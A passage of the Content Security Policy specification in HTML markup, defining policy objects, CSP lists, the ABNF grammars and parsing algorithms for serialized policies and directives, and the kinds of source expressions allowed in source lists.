  and restricted behaviors, and may be applied to a <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document①">Document</a></code>, <code class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/workers.html#workerglobalscope" id="ref-for-workerglobalscope">WorkerGlobalScope</a></code>, or <code class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/worklets.html#workletglobalscope" id="ref-for-workletglobalscope">WorkletGlobalScope</a></code> as described in <a href="#initialize-global-object-csp" id="ref-for-initialize-global-object-csp">§ 4.2.2 Initialize a global object’s CSP list</a> and in <a href="#initialize-document-csp" id="ref-for-initialize-document-csp">§ 4.2.1 Initialize a Document’s CSP list</a>.</p>
    <p>Each policy has an associated <dfn class="dfn-paneled" data-dfn-for="policy" data-dfn-type="dfn" data-export id="policy-directive-set">directive set</dfn>, which is an <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ordered-set" id="ref-for-ordered-set">ordered
  set</a> of <a data-link-type="dfn" href="#directives" id="ref-for-directives">directives</a> that define the policy’s implications when applied.</p>
    <p>Each policy has an associated <dfn class="dfn-paneled" data-dfn-for="policy" data-dfn-type="dfn" data-export id="policy-disposition">disposition</dfn>, which is either
  "<code>enforce</code>" or "<code>report</code>".</p>
    <p>Each policy has an associated <dfn class="dfn-paneled" data-dfn-for="policy" data-dfn-type="dfn" data-export id="policy-source">source</dfn>, which is either "<code>header</code>"
  or "<code>meta</code>".</p>
    <p>Each policy has an associated <dfn class="dfn-paneled" data-dfn-for="policy" data-dfn-type="dfn" data-export id="policy-self-origin">self-origin</dfn>, which
  is an <a data-link-type="dfn" href="https://html.spec.whatwg.org/#concept-origin" id="ref-for-concept-origin">origin</a> that is used when matching the <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self"><code>'self'</code></a> keyword.</p>
    <p class="note" role="note"><span class="marker">Note:</span> This is needed to facilitate the <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self①"><code>'self'</code></a> checks of <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#local-scheme" id="ref-for-local-scheme①">local scheme</a> documents/workers that have inherited their policy but
  have an <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/browsers.html#concept-origin-opaque" id="ref-for-concept-origin-opaque">opaque origin</a>. Most of the time this will simply be the <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#environment-settings-object" id="ref-for-environment-settings-object">environment settings object</a>’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-origin" id="ref-for-concept-settings-object-origin">origin</a>.
  The <a href="#initialize-document-csp" id="ref-for-initialize-document-csp①">§ 4.2.1 Initialize a Document’s CSP list</a> algorithm describes situations in which
  a policy is inherited.</p>
    <p>Multiple <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object">policies</a> can be applied to a single resource, and are collected into a <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list" id="ref-for-list">list</a> of <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object①">policies</a> known as a <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="csp-list">CSP list</dfn>.</p>
    <p>A <a data-link-type="dfn" href="#csp-list" id="ref-for-csp-list">CSP list</a> <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="contains-a-header-delivered-content-security-policy">contains a header-delivered Content Security Policy</dfn> if it <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-contain" id="ref-for-list-contain">contains</a> a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object②">policy</a> whose <a data-link-type="dfn" href="#policy-source" id="ref-for-policy-source">source</a> is "<code>header</code>".</p>
    <p>A <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="serialized-csp">serialized CSP</dfn> is an <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-string" id="ref-for-ascii-string">ASCII string</a> consisting of a semicolon-delimited
  series of <a data-link-type="dfn" href="#serialized-directive" id="ref-for-serialized-directive">serialized directives</a>, adhering to the following ABNF grammar <a data-link-type="biblio" href="#biblio-rfc5234" title="Augmented BNF for Syntax Specifications: ABNF">[RFC5234]</a>:</p>
<pre><dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-serialized-policy">serialized-policy</dfn> =
    <a data-link-type="grammar" href="#grammardef-serialized-directive" id="ref-for-grammardef-serialized-directive">serialized-directive</a> *( <a data-link-type="grammar" href="#grammardef-optional-ascii-whitespace" id="ref-for-grammardef-optional-ascii-whitespace⑤">optional-ascii-whitespace</a> ";" [ <a data-link-type="grammar" href="#grammardef-optional-ascii-whitespace" id="ref-for-grammardef-optional-ascii-whitespace⑥">optional-ascii-whitespace</a> <a data-link-type="grammar" href="#grammardef-serialized-directive" id="ref-for-grammardef-serialized-directive①">serialized-directive</a> ] )
</pre>
    <p>A <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="serialized-csp-list">serialized CSP list</dfn> is an <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-string" id="ref-for-ascii-string①">ASCII string</a> consisting of a comma-delimited
  series of <a data-link-type="dfn" href="#serialized-csp" id="ref-for-serialized-csp">serialized CSPs</a>, adhering to the following ABNF grammar <a data-link-type="biblio" href="#biblio-rfc5234" title="Augmented BNF for Syntax Specifications: ABNF">[RFC5234]</a>:</p>
<pre><dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-serialized-policy-list">serialized-policy-list</dfn> = 1#<a data-link-type="grammar" href="#grammardef-serialized-policy" id="ref-for-grammardef-serialized-policy">serialized-policy</a>
                    ; The '#' rule is the one defined in section 7 of RFC 7230
                    ; but it incorporates the modifications specified
                    ; in section 2.1 of this document.
</pre>
    <h4 class="heading settled algorithm" data-algorithm="Parse a serialized CSP" data-level="2.2.1" id="parse-serialized-policy"><span class="secno">2.2.1. </span><span class="content"> Parse a serialized CSP </span><a class="self-link" href="#parse-serialized-policy"></a></h4>
    <p>To <dfn class="dfn-paneled" data-dfn-type="abstract-op" data-export id="abstract-opdef-parse-a-serialized-csp">parse a serialized CSP</dfn>, given a <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#string" id="ref-for-string">string</a> (<var>serialized</var>), a <a data-link-type="dfn" href="#policy-source" id="ref-for-policy-source①">source</a> (<var>source</var>), and a <a data-link-type="dfn" href="#policy-disposition" id="ref-for-policy-disposition">disposition</a> (<var>disposition</var>), execute the
  following steps.</p>
    <p>This algorithm returns a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object③">Content Security Policy object</a>. If <var>serialized</var> could not be
  parsed, the object’s <a data-link-type="dfn" href="#policy-directive-set" id="ref-for-policy-directive-set">directive set</a> will be empty.</p>
    <ol class="algorithm">
     <li data-md>
      <p>Let <var>policy</var> be a new <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object④">policy</a> with an empty <a data-link-type="dfn" href="#policy-directive-set" id="ref-for-policy-directive-set①">directive set</a>, a <a data-link-type="dfn" href="#policy-source" id="ref-for-policy-source②">source</a> of <var>source</var>, and a <a data-link-type="dfn" href="#policy-disposition" id="ref-for-policy-disposition①">disposition</a> of <var>disposition</var>.</p>
     <li data-md>
      <p>For each <var>token</var> returned by <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#strictly-split" id="ref-for-strictly-split">strictly splitting</a> <var>serialized</var> on
  the U+003B SEMICOLON character (<code>;</code>):</p>
      <ol>
       <li data-md>
        <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#strip-leading-and-trailing-ascii-whitespace" id="ref-for-strip-leading-and-trailing-ascii-whitespace">Strip leading and trailing ASCII whitespace</a> from <var>token</var>.</p>
       <li data-md>
        <p>If <var>token</var> is an empty string, or if <var>token</var> is not an <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-string" id="ref-for-ascii-string②">ASCII string</a>, <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#iteration-continue" id="ref-for-iteration-continue">continue</a>.</p>
       <li data-md>
        <p>Let <var>directive name</var> be the result of <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#collect-a-sequence-of-code-points" id="ref-for-collect-a-sequence-of-code-points">collecting a sequence of code points</a> from <var>token</var> which are not <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-whitespace" id="ref-for-ascii-whitespace①">ASCII whitespace</a>.</p>
       <li data-md>
        <p>Set <var>directive name</var> to be the result of running <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-lowercase" id="ref-for-ascii-lowercase">ASCII lowercase</a> on <var>directive name</var>.</p>
        <p class="note" role="note"><span class="marker">Note:</span> Directive names are case-insensitive, that is: <code>script-SRC 'none'</code> and <code>ScRiPt-sRc 'none'</code> are equivalent.</p>
       <li data-md>
        <p>If <var>policy</var>’s <a data-link-type="dfn" href="#policy-directive-set" id="ref-for-policy-directive-set②">directive set</a> contains a <a data-link-type="dfn" href="#directives" id="ref-for-directives①">directive</a> whose <a data-link-type="dfn" href="#directive-name" id="ref-for-directive-name">name</a> is <var>directive name</var>, <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#iteration-continue" id="ref-for-iteration-continue①">continue</a>.</p>
        <p class="note" role="note"><span class="marker">Note:</span> In this case, the user agent SHOULD notify developers that a duplicate
  directive was ignored. A console warning might be appropriate, for example.</p>
       <li data-md>
        <p>Let <var>directive value</var> be the result of <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#split-on-ascii-whitespace" id="ref-for-split-on-ascii-whitespace">splitting <var>token</var> on
  ASCII whitespace</a>.</p>
       <li data-md>
        <p>Let <var>directive</var> be a new <a data-link-type="dfn" href="#directives" id="ref-for-directives②">directive</a> whose <a data-link-type="dfn" href="#directive-name" id="ref-for-directive-name①">name</a> is <var>directive name</var>, and <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value">value</a> is <var>directive value</var>.</p>
       <li data-md>
        <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#set-append" id="ref-for-set-append">Append</a> <var>directive</var> to <var>policy</var>’s <a data-link-type="dfn" href="#policy-directive-set" id="ref-for-policy-directive-set③">directive set</a>.</p>
      </ol>
     <li data-md>
      <p>Return <var>policy</var>.</p>
    </ol>
    <h4 class="heading settled algorithm" data-algorithm="Parse a serialized CSP list" data-level="2.2.2" id="parse-serialized-policy-list"><span class="secno">2.2.2. </span><span class="content"> Parse a serialized CSP list </span><a class="self-link" href="#parse-serialized-policy-list"></a></h4>
    <p>To <dfn class="dfn-paneled" data-dfn-type="abstract-op" data-export id="abstract-opdef-parse-a-serialized-csp-list">parse a serialized CSP list</dfn>, given a <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#byte-sequence" id="ref-for-byte-sequence">byte sequence</a> or <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#string" id="ref-for-string①">string</a> (<var>list</var>), a <a data-link-type="dfn" href="#policy-source" id="ref-for-policy-source③">source</a> (<var>source</var>), and a <a data-link-type="dfn" href="#policy-disposition" id="ref-for-policy-disposition②">disposition</a> (<var>disposition</var>), execute
  the following steps.</p>
    <p>This algorithm returns a <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list" id="ref-for-list①">list</a> of <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑤">Content Security Policy objects</a>. If <var>list</var> cannot be
  parsed, the returned list will be empty.</p>
    <ol class="algorithm">
     <li data-md>
      <p>If <var>list</var> is a <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#byte-sequence" id="ref-for-byte-sequence①">byte sequence</a>, then set <var>list</var> to be the result of <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#isomorphic-decode" id="ref-for-isomorphic-decode">isomorphic decoding</a> <var>list</var>.</p>
     <li data-md>
      <p>Let <var>policies</var> be an empty <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list" id="ref-for-list②">list</a>.</p>
     <li data-md>
      <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate" id="ref-for-list-iterate">For each</a> <var>token</var> returned by <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#split-on-commas" id="ref-for-split-on-commas">splitting <var>list</var> on commas</a>:</p>
      <ol>
       <li data-md>
        <p>Let <var>policy</var> be the result of <a data-link-type="abstract-op" href="#abstract-opdef-parse-a-serialized-csp" id="ref-for-abstract-opdef-parse-a-serialized-csp">parsing</a> <var>token</var>, with a <a data-link-type="dfn" href="#policy-source" id="ref-for-policy-source④">source</a> of <var>source</var>, and <a data-link-type="dfn" href="#policy-disposition" id="ref-for-policy-disposition③">disposition</a> of <var>disposition</var>.</p>
       <li data-md>
        <p>If <var>policy</var>’s <a data-link-type="dfn" href="#policy-directive-set" id="ref-for-policy-directive-set④">directive set</a> is empty, <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#iteration-continue" id="ref-for-iteration-continue②">continue</a>.</p>
       <li data-md>
        <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-append" id="ref-for-list-append">Append</a> <var>policy</var> to <var>policies</var>.</p>
      </ol>
     <li data-md>
      <p>Return <var>policies</var>.</p>
    </ol>
    <h3 class="heading settled" data-level="2.3" id="framework-directives"><span class="secno">2.3. </span><span class="content">Directives</span><a class="self-link" href="#framework-directives"></a></h3>
    <p>Each <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑥">policy</a> contains an <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ordered-set" id="ref-for-ordered-set①">ordered set</a> of <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="directives">directives</dfn> (its <a data-link-type="dfn" href="#policy-directive-set" id="ref-for-policy-directive-set⑤">directive set</a>), each of which controls a specific behavior. The directives
  defined in this document are described in detail in <a href="#csp-directives">§ 6 Content Security Policy Directives</a>.</p>
    <p>Each <a data-link-type="dfn" href="#directives" id="ref-for-directives③">directive</a> is a <dfn class="dfn-paneled" data-dfn-for="directive" data-dfn-type="dfn" data-export id="directive-name">name</dfn> / <dfn class="dfn-paneled" data-dfn-for="directive" data-dfn-type="dfn" data-export id="directive-value">value</dfn> pair. The <a data-link-type="dfn" href="#directive-name" id="ref-for-directive-name②">name</a> is a
  non-empty <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#string" id="ref-for-string②">string</a>, and the <a data-link-type="dfn">value</a> is a <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ordered-set" id="ref-for-ordered-set②">set</a> of non-empty <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#string" id="ref-for-string③">strings</a>. The <a data-link-type="dfn">value</a> MAY be <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-is-empty" id="ref-for-list-is-empty">empty</a>.</p>
    <p>A <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="serialized-directive">serialized directive</dfn> is an <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-string" id="ref-for-ascii-string③">ASCII string</a>, consisting of one or more
  whitespace-delimited tokens, and adhering to the following ABNF <a data-link-type="biblio" href="#biblio-rfc5234" title="Augmented BNF for Syntax Specifications: ABNF">[RFC5234]</a>:</p>
<pre><dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-serialized-directive">serialized-directive</dfn> = <a data-link-type="grammar" href="#grammardef-directive-name" id="ref-for-grammardef-directive-name">directive-name</a> [ <a data-link-type="grammar" href="#grammardef-required-ascii-whitespace" id="ref-for-grammardef-required-ascii-whitespace">required-ascii-whitespace</a> <a data-link-type="grammar" href="#grammardef-directive-value" id="ref-for-grammardef-directive-value">directive-value</a> ]
<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-directive-name">directive-name</dfn>       = 1*( <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc5234#appendix-B.1" id="ref-for-appendix-B.1">ALPHA</a> / <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc5234#appendix-B.1" id="ref-for-appendix-B.1①">DIGIT</a> / "-" )
<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-directive-value">directive-value</dfn>      = *( <a data-link-type="grammar" href="#grammardef-required-ascii-whitespace" id="ref-for-grammardef-required-ascii-whitespace①">required-ascii-whitespace</a> / ( %x21-%x2B / %x2D-%x3A / %x3C-%x7E ) )
                       ; Directive values may contain whitespace and <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc5234#appendix-B.1" id="ref-for-appendix-B.1②">VCHAR</a> characters,
                       ; excluding ";" and ",". The second half of the definition
                       ; above represents all <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc5234#appendix-B.1" id="ref-for-appendix-B.1③">VCHAR</a> characters (%x21-%x7E)
                       ; without ";" and "," (%x3B and %x2C respectively)

; <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc5234#appendix-B.1" id="ref-for-appendix-B.1④">ALPHA</a>, <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc5234#appendix-B.1" id="ref-for-appendix-B.1⑤">DIGIT</a>, and <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc5234#appendix-B.1" id="ref-for-appendix-B.1⑥">VCHAR</a> are defined in Appendix B.1 of RFC 5234.
</pre>
    <p><a data-link-type="dfn" href="#directives" id="ref-for-directives④">Directives</a> have a number of associated algorithms:</p>
    <ol>
     <li data-md>
      <p>A <dfn class="dfn-paneled" data-dfn-for="directive" data-dfn-type="dfn" data-export id="directive-pre-request-check">pre-request check</dfn>, which takes a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request">request</a> and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑦">policy</a> as an argument, and is executed
  during <a href="#should-block-request" id="ref-for-should-block-request">§ 4.1.3 Should request be blocked by Content Security Policy?</a>. This algorithm returns "<code>Allowed</code>" unless
  otherwise specified.</p>
     <li data-md>
      <p>A <dfn class="dfn-paneled" data-dfn-for="directive" data-dfn-type="dfn" data-export id="directive-post-request-check">post-request check</dfn>, which takes a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request①">request</a>, a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response">response</a>, and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑧">policy</a> as arguments,
  and is executed during <a href="#should-block-response" id="ref-for-should-block-response">§ 4.1.4 Should response to request be blocked by Content Security Policy?</a>. This algorithm returns
  "<code>Allowed</code>" unless otherwise specified.</p>
     <li data-md>
      <p>A <dfn class="dfn-paneled" data-dfn-for="directive" data-dfn-type="dfn" data-export id="directive-response-check">response check</dfn>, which takes a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request②">request</a>, a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response①">response</a>, and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑨">policy</a> as arguments,
  and is executed during <a href="#should-block-response" id="ref-for-should-block-response①">§ 4.1.4 Should response to request be blocked by Content Security Policy?</a>. This algorithm returns
  "<code>Allowed</code>" unless otherwise specified.</p>
     <li data-md>
      <p>An <dfn class="dfn-paneled" data-dfn-for="directive" data-dfn-type="dfn" data-export id="directive-inline-check">inline check</dfn>, which takes an <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#element" id="ref-for-element">Element</a></code>, a
  type string, a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object①⓪">policy</a>, and a source string as arguments,
  and is executed during <a href="#should-block-inline" id="ref-for-should-block-inline">§ 4.2.4 Should element’s inline type behavior be blocked by Content Security Policy?</a> and during <a href="#should-block-navigation-request" id="ref-for-should-block-navigation-request">§ 4.2.5 Should navigation request of type be blocked
    by Content Security Policy?</a> for <code>javascript:</code> requests. This
  algorithm returns "<code>Allowed</code>" unless otherwise specified.</p>
     <li data-md>
      <p>An <dfn class="dfn-paneled" data-dfn-for="directive" data-dfn-type="dfn" data-export id="directive-initialization">initialization</dfn>, which takes a <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document②">Document</a></code> or <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object" id="ref-for-global-object">global object</a>, a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response②">response</a>, and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object①①">policy</a> as arguments. This algorithm is executed during <a href="#initialize-document-csp" id="ref-for-initialize-document-csp②">§ 4.2.1 Initialize a Document’s CSP list</a>,
  and has no effect unless otherwise specified.</p>
     <li data-md>
      <p>A <dfn class="dfn-paneled" data-dfn-for="directive" data-dfn-type="dfn" data-export id="directive-pre-navigation-check">pre-navigation check</dfn>, which takes a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request③">request</a>, a navigation type string ("<code>form-submission</code>"
  or "<code>other</code>"), and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object①②">policy</a> as arguments, and
  is executed during <a href="#should-block-navigation-request" id="ref-for-should-block-navigation-request①">§ 4.2.5 Should navigation request of type be blocked
    by Content Security Policy?</a>. It returns
  "<code>Allowed</code>" unless otherwise specified.</p>
     <li data-md>
      <p>A <dfn class="dfn-paneled" data-dfn-for="directive" data-dfn-type="dfn" data-export id="directive-navigation-response-check">navigation response check</dfn>, which takes a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request④">request</a>, a navigation type string ("<code>form-submission</code>" or "<code>other</code>"),
  a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response③">response</a>, a <a data-link-type="dfn" href="https://html.spec.whatwg.org/#browsing-context" id="ref-for-browsing-context">browsing context</a>, a check type string ("<code>source</code>"
  or "<code>response</code>"), and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object①③">policy</a> as arguments, and is executed during <a href="#should-block-navigation-response" id="ref-for-should-block-navigation-response">§ 4.2.6 Should navigation response to navigation request of type
    in target be blocked by Content Security Policy?</a>. It returns "<code>Allowed</code>" unless otherwise specified.</p>
    </ol>
    <h4 class="heading settled" data-level="2.3.1" id="framework-directive-source-list"><span class="secno">2.3.1. </span><span class="content">Source Lists</span><a class="self-link" href="#framework-directive-source-list"></a></h4>
    <p>Many <a data-link-type="dfn" href="#directives" id="ref-for-directives⑤">directives</a>' <a data-link-type="dfn">values</a> consist of <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="source-lists">source lists</dfn>: <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ordered-set" id="ref-for-ordered-set③">sets</a> of <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#string" id="ref-for-string④">strings</a> which identify content that can be fetched and potentially embedded or
  executed. Each <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#string" id="ref-for-string⑤">string</a> represents one of the following types of <dfn class="dfn-paneled" data-dfn-type="dfn" data-export data-lt="source expression" id="source-expression">source
  expression</dfn>:</p>
    <ol>
     <li data-md>
      <p>Keywords such as <a data-link-type="grammar" href="#grammardef-none" id="ref-for-grammardef-none"><code>'none'</code></a> and <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self②"><code>'self'</code></a> (which match nothing and the current
  URL’s origin, respectively)</p>
     <li data-md>
      <p>Serialized URLs such as <code>https://example.com/path/to/file.js</code> (which matches a specific file) or <code>https://example.com/</code> (which matches everything on that origin)</p>
     <li data-md>
      <p>Schemes such as <code>https:</code> (which matches any resource having
  the specified scheme)</p>
     <li data-md>
      <p>Hosts such as <code>example.com</code> (which matches any resource on
  the host, regardless of scheme) or <code>*.example.com</code> (which
  matches any resource on the host’s subdomains (and any of
  its subdomains' subdomains, and so on))</p>
     <li data-md>
      <p>Nonces such as <code>'nonce-ch4hvvbHDpv7xCSvXCs3BrNggHdTzxUA'</code> (which can match
  specific elements on a page)</p>
     <li data-md>
      <p>Digests such as <code>'sha256-abcd...'</code> (which can match specific
  elements on a page)</p>
    </ol>
    <p>A <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="serialized-source-list">serialized source list</dfn> is an <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-string" id="ref-for-ascii-string④">ASCII string</a>, consisting of a
  whitespace-delimited series of <a data-link-type="dfn" href="#source-expression" id="ref-for-source-expression①">source expressions</a>, adhering to the following ABNF grammar <a data-link-type="biblio" href="#biblio-rfc5234" title="Augmented BNF for Syntax Specifications: ABNF">[RFC5234]</a>:</p>
<pre><dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-serialized-source-list">serialized-source-list</dfn> = ( <a data-link-type="grammar" href="#grammardef-source-expression" id="ref-for-grammardef-source-expression">source-expression</a> *( <a data-link-type="grammar" href="#grammardef-required-ascii-whitespace" id="ref-for-grammardef-required-ascii-whitespace②">required-ascii-whitespace</a> <a data-link-type="grammar" href="#grammardef-source-expression" id="ref-for-grammardef-source-expression①">source-expression</a> ) ) / "<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-none">'none'</dfn>"
<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-source-expression">source-expression</dfn>      = <a data-link-type="grammar" href="#grammardef-scheme-source" id="ref-for-grammardef-scheme-source">scheme-source</a> / <a data-link-type="grammar" href="#grammardef-host-source" id="ref-for-grammardef-host-source">host-source</a> / <a data-link-type="grammar" href="#grammardef-keyword-source" id="ref-for-grammardef-keyword-source">keyword-source</a>
                         / <a data-link-type="grammar" href="#grammardef-nonce-source" id="ref-for-grammardef-nonce-source">nonce-source</a> / <a data-link-type="grammar" href="#grammardef-hash-source" id="ref-for-grammardef-hash-source">hash-source</a>

; Schemes: "https:" / "custom-scheme:" / "another.custom-scheme:"
<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-scheme-source">scheme-source</dfn> = <a data-link-type="grammar" href="#grammardef-scheme-part" id="ref-for-grammardef-scheme-part">scheme-part</a> ":"

; Hosts: "example.com" / "*.example.com" / "https://*.example.com:12/path/to/file.js"
<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-host-source">host-source</dfn> = [ <a data-link-type="grammar" href="#grammardef-scheme-part" id="ref-for-grammardef-scheme-part①">scheme-part</a> "://" ] <a data-link-type="grammar" href="#grammardef-host-part" id="ref-for-grammardef-host-part">host-part</a> [ ":" <a data-link-type="grammar" href="#grammardef-port-part" id="ref-for-grammardef-port-part">port-part</a> ] [ <a data-link-type="grammar" href="#grammardef-path-part" id="ref-for-grammardef-path-part">path-part</a> ]
<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-scheme-part">scheme-part</dfn> = <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc3986#section-3.1" id="ref-for-section-3.1">scheme</a>
              ; <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc3986#section-3.1" id="ref-for-section-3.1①">scheme</a> is defined in section 3.1 of RFC 3986.
<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-host-part">host-part</dfn>   = "*" / [ "*." ] 1*<a data-link-type="grammar" href="#grammardef-host-char" id="ref-for-grammardef-host-char">host-char</a> *( "." 1*<a data-link-type="grammar" href="#grammardef-host-char" id="ref-for-grammardef-host-char①">host-char</a> )
<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-host-char">host-char</dfn>   = <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc5234#appendix-B.1" id="ref-for-appendix-B.1⑦">ALPHA</a> / <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc5234#appendix-B.1" id="ref-for-appendix-B.1⑧">DIGIT</a> / "-"
<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-port-part">port-part</dfn>   = 1*<a data-link-type="grammar" href="https://tools.ietf.org/html/rfc5234#appendix-B.1" id="ref-for-appendix-B.1⑨">DIGIT</a> / "*"
<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-path-part">path-part</dfn>   = <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc3986#section-3.3" id="ref-for-section-3.3">path-absolute</a> (but not including ";" or ",")
              ; <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc3986#section-3.3" id="ref-for-section-3.3①">path-absolute</a> is defined in section 3.3 of RFC 3986.

; Keywords:
<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-keyword-source">keyword-source</dfn> = "<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-self">'self'</dfn>" / "<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-unsafe-inline">'unsafe-inline'</dfn>" / "<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-unsafe-eval">'unsafe-eval'</dfn>"
                 / "<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-strict-dynamic">'strict-dynamic'</dfn>" / "<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-unsafe-hashes">'unsafe-hashes'</dfn>" /
                 / "<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-report-sample">'report-sample'</dfn>" / "<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-unsafe-allow-redirects">'unsafe-allow-redirects'</dfn>"

ISSUE: Bikeshed <code>unsafe-allow-redirects</code>.

; Nonces: 'nonce-[nonce goes here]'
